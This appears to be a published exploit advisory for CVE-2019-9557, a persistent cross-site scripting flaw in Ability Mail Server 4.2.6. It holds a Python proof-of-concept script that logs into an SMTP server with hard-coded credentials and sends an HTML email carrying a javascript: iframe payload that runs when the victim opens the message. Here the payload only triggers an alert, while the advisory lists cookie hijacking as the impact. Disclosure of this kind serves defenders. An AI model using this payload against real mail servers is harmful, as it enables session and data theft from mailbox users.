
# Exploit Title: Persistent Cross Site Scripting Ability Mail Server 4.2.6 
# CVE: CVE-2019-9557
# Exploit Author: Aloyce J. Makalanga
# Contact: https://twitter.com/aloycemjr <https://twitter.com/aloycemjr>
# Vendor Homepage: https://www.codecrafters.com/AbilityMailServer <https://www.codecrafters.com/AbilityMailServer>
# Category: webapps
# Attack Type: Remote
# Impact: Data/Cookie hijacking

 
1. Description


> Ability Mail Server 4.2.6 has Persistent Cross Site Scripting (XSS) via
> the body e-mail body. To exploit the vulnerability, the victim must
> open an email with malicious Javascript inserted into the body of the
> email as an iframe.


   
2. Proof of Concept


#!/usr/bin/env python -tt
# -*- coding: utf-8 -*-

# Import modules
import smtplib


def trigger_persistence_xss():
    email_addr = 'attacker@aloyce.local'
    email = 'From: %s\n' % email_addr
    email += 'To: %s\n' % email_addr
    email += 'Subject: XSS\n'
    email += 'Content-type: text/html\n\n'
    email += "<IFRAME SRC='javascript:alert('XSS');'></IFRAME>"
    s = smtplib.SMTP('192.168.1.172', 25)
    s.login(email_addr, "123456")
    s.sendmail(email_addr, email_addr, email)
    s.quit()


def main():
    pass


if __name__ == '__main__':
    trigger_persistence_xss()
    main()
